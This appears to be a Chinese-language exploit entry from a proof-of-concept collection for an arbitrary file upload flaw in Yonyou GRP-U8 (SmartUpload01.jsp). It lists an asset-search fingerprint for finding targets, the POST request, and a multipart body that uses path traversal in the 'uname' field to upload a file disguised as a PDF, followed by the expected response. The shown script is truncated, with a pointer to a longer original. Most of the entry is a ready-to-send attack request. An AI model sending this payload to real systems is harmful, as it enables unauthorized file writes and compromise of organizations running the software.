# 用友GRP-U8SmartUpload01文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /u8qx/SmartUpload01.jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzhvrkrqt`

**请求体 / payload**
```
------WebKitFormBoundaryzhvrkrqt
Content-Disposition: form-data; name="uname"
../../../../../../../../../dudesuite
------WebKitFormBoundaryzhvrkrqt
Content-Disposition: form-data; name="input_localfile"; filename="dudesuite.pdf"
<jatools Class="jatools.ReportDocument" Name="jatools report template">
<VariableContext>
</VariableContext>
<Page>
<Name>panel</Name>
<Children ItemClass="PagePanel">
<Item0>
<Name>header</Name>
<Width>753</Width>
<Height>80</Height>
<Children ItemClass="Label">
<Item0>
<Text>用一个Student对象,和其getMembers()方法,作成一个嵌套的表格dlvmwt</Text>
<ForeColor>-65536</ForeColor>
<X>41</X>
…（脚本共 3150 字，完整版见原文）
```
- **预期**：200　|　dudesuite